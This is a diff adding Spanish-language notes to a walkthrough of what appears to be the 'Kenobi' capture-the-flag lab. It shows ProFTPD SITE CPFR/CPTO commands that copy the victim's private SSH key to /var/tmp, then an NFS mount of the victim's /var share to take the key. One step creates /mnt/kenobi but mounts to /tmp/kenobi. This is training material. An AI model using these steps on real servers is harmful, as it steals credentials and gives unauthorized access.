@@ -58,9 +58,23 @@ TODAS LAS IPS QUE SE VEN AQUÍ CAMBIAN...
 ## Moviendo la llave privada de kenobi
 
 - SITE CPFR /home/kenobi/.ssh/id_rsa
-- 
+- SITE CPTO /var/tmp/id_rsa (Este último es porque le tienes que agregar un archivo como parametro, por es el último de id_rsa) 
+- OJO, dentro de la máquina víctima, lo copiamos hacia la carpeta /var porque a esa sí tenemos acceso, está dentro de la carpeta www
+![image](https://user-images.githubusercontent.com/44788583/149612421-9bfb6dec-0a7e-476d-bdd8-d14a3b133217.png)
 
-- 
+## Montando volumen 
+
+- Lo primero que se debe hacer es una carpeta donde montaremos el volumen copiado. La recomendación es crearla adentro de mnt que es donde usualmente se montan los volúmenes nuevos
+- sudo mkdir /mnt/kenobi
+
+![image](https://user-images.githubusercontent.com/44788583/149612680-fe046e3b-c937-44da-b42b-54777b4d2374.png)
+
+- checamos que la carpeta exista con ls /mnt
+- luego monntamos el volumen con mount 10.10.197.207:/var /tmp/kenobi (la ip de la máquina vulnerada y la carpeta de la misma, después como segundo parámetro en dónde la estamos montando en nuestra máquina
+![image](https://user-images.githubusercontent.com/44788583/149612857-c0a24a63-bf3f-4f77-ad79-bdbb78af58e5.png)
+
+- ls -al para checar los permisos que tenemos 
+![image](https://user-images.githubusercontent.com/44788583/149612887-af767f3c-7aea-4d73-9d21-dc0b86767a3b.png)
 
 
 
